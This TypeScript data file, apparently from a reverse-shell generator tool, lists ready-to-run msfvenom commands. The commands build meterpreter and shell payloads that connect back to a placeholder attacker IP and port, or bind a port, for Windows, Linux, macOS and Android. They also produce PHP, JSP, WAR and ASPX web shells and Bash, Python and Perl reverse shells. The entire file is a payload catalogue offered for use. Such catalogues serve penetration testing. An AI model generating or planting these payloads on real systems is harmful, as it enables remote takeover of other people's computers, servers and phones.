// To add an entry: append { name, command, os, tags, listener } to MSFVENOM.
// Placeholders: {ip}, {port}.
// `listener` names an entry in LISTENERS (listeners.ts).
import type { Payload } from './types'

export const MSFVENOM: Payload[] = [
  // Windows executables, DLLs, services and installers
  { name: 'Windows x64 meterpreter reverse TCP (staged, exe)', command: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe', os: ['windows'], tags: ['staged', 'meterpreter'], listener: 'msfconsole (meterpreter)' },
  { name: 'Windows x86 meterpreter reverse TCP (staged, exe)', command: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe', os: ['windows'], tags: ['staged', 'meterpreter'], listener: 'msfconsole (meterpreter)' },
  { name: 'Windows x64 meterpreter reverse TCP (stageless, exe)', command: 'msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe', os: ['windows'], tags: ['stageless', 'meterpreter'], listener: 'msfconsole (meterpreter)' },
  { name: 'Windows x86 meterpreter reverse TCP (stageless, exe)', command: 'msfvenom -p windows/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe', os: ['windows'], tags: ['stageless', 'meterpreter'], listener: 'msfconsole (meterpreter)' },
  { name: 'Windows x64 shell reverse TCP (staged, exe)', command: 'msfvenom -p windows/x64/shell/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe', os: ['windows'], tags: ['staged', 'shell'], listener: 'msfconsole' },
  { name: 'Windows x86 shell reverse TCP (staged, exe)', command: 'msfvenom -p windows/shell/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe', os: ['windows'], tags: ['staged', 'shell'], listener: 'msfconsole' },
  { name: 'Windows x64 shell reverse TCP (stageless, exe)', command: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe', os: ['windows'], tags: ['stageless', 'shell'], listener: 'msfconsole' },
  { name: 'Windows x86 shell reverse TCP (stageless, exe)', command: 'msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe', os: ['windows'], tags: ['stageless', 'shell'], listener: 'msfconsole' },
  { name: 'Windows x64 meterpreter reverse TCP (staged, dll)', command: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f dll -o reverse.dll', os: ['windows'], tags: ['staged', 'meterpreter'], listener: 'msfconsole (meterpreter)' },
  { name: 'Windows x86 meterpreter reverse TCP (staged, dll)', command: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f dll -o reverse.dll', os: ['windows'], tags: ['staged', 'meterpreter'], listener: 'msfconsole (meterpreter)' },
  { name: 'Windows x64 meterpreter reverse TCP (staged, service exe)', command: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe-service -o service.exe', os: ['windows'], tags: ['staged', 'meterpreter'], listener: 'msfconsole (meterpreter)' },
  { name: 'Windows x64 meterpreter reverse TCP (staged, msi)', command: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f msi -o reverse.msi', os: ['windows'], tags: ['staged', 'meterpreter'], listener: 'msfconsole (meterpreter)' },
  { name: 'Windows x64 meterpreter bind TCP (staged, exe)', command: 'msfvenom -p windows/x64/meterpreter/bind_tcp LPORT={port} -f exe -o bind.exe', os: ['windows'], tags: ['staged', 'meterpreter', 'bind'], listener: 'msfconsole (meterpreter, bind)' },
  { name: 'Windows x64 shell bind TCP (stageless, exe)', command: 'msfvenom -p windows/x64/shell_bind_tcp LPORT={port} -f exe -o bind.exe', os: ['windows'], tags: ['stageless', 'shell', 'bind'], listener: 'msfconsole (bind)' },
  // Linux ELF
  { name: 'Linux x64 meterpreter reverse TCP (staged, elf)', command: 'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf', os: ['linux'], tags: ['staged', 'meterpreter'], listener: 'msfconsole (meterpreter)' },
  { name: 'Linux x86 meterpreter reverse TCP (staged, elf)', command: 'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf', os: ['linux'], tags: ['staged', 'meterpreter'], listener: 'msfconsole (meterpreter)' },
  { name: 'Linux x64 meterpreter reverse TCP (stageless, elf)', command: 'msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf', os: ['linux'], tags: ['stageless', 'meterpreter'], listener: 'msfconsole (meterpreter)' },
  { name: 'Linux x86 meterpreter reverse TCP (stageless, elf)', command: 'msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf', os: ['linux'], tags: ['stageless', 'meterpreter'], listener: 'msfconsole (meterpreter)' },
  { name: 'Linux x64 shell reverse TCP (staged, elf)', command: 'msfvenom -p linux/x64/shell/reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf', os: ['linux'], tags: ['staged', 'shell'], listener: 'msfconsole' },
  { name: 'Linux x86 shell reverse TCP (staged, elf)', command: 'msfvenom -p linux/x86/shell/reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf', os: ['linux'], tags: ['staged', 'shell'], listener: 'msfconsole' },
  { name: 'Linux x64 shell reverse TCP (stageless, elf)', command: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf', os: ['linux'], tags: ['stageless', 'shell'], listener: 'msfconsole' },
  { name: 'Linux x86 shell reverse TCP (stageless, elf)', command: 'msfvenom -p linux/x86/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf', os: ['linux'], tags: ['stageless', 'shell'], listener: 'msfconsole' },
  { name: 'Linux x64 shell bind TCP (stageless, elf)', command: 'msfvenom -p linux/x64/shell_bind_tcp LPORT={port} -f elf -o bind.elf', os: ['linux'], tags: ['stageless', 'shell', 'bind'], listener: 'msfconsole (bind)' },
  // macOS Mach-O
  { name: 'macOS x64 shell reverse TCP (stageless, macho)', command: 'msfvenom -p osx/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f macho -o reverse.macho', os: ['mac'], tags: ['stageless', 'shell'], listener: 'msfconsole' },
  // Web payloads
  { name: 'PHP meterpreter reverse TCP (stageless, php)', command: 'msfvenom -p php/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.php', os: ['linux', 'windows', 'mac'], tags: ['stageless', 'meterpreter'], listener: 'msfconsole (meterpreter)' },
  { name: 'JSP shell reverse TCP (stageless, jsp)', command: 'msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.jsp', os: ['linux', 'windows', 'mac'], tags: ['stageless', 'shell'], listener: 'msfconsole' },
  { name: 'Java shell reverse TCP (stageless, war)', command: 'msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f war -o shell.war', os: ['linux', 'windows', 'mac'], tags: ['stageless', 'shell'], listener: 'msfconsole' },
  { name: 'Windows x86 shell reverse TCP (stageless, aspx)', command: 'msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port} -f aspx -o shell.aspx', os: ['windows'], tags: ['stageless', 'shell'], listener: 'msfconsole' },
  { name: 'Windows x64 shell reverse TCP (stageless, aspx)', command: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f aspx -o shell.aspx', os: ['windows'], tags: ['stageless', 'shell'], listener: 'msfconsole' },
  // Scripting payloads
  { name: 'Python shell reverse TCP (stageless, py)', command: 'msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw -o shell.py', os: ['linux'], tags: ['stageless', 'shell'], listener: 'msfconsole' },
  { name: 'Bash shell reverse TCP (stageless, sh)', command: 'msfvenom -p cmd/unix/reverse_bash LHOST={ip} LPORT={port} -f raw -o shell.sh', os: ['linux'], tags: ['stageless', 'shell'], listener: 'msfconsole' },
  { name: 'Perl shell reverse TCP (stageless, pl)', command: 'msfvenom -p cmd/unix/reverse_perl LHOST={ip} LPORT={port} -f raw -o shell.pl', os: ['linux'], tags: ['stageless', 'shell'], listener: 'msfconsole' },
  // Android
  { name: 'Android meterpreter reverse TCP (staged, apk)', command: 'msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.apk', os: ['linux'], tags: ['staged', 'meterpreter'], listener: 'msfconsole (meterpreter)' },
]
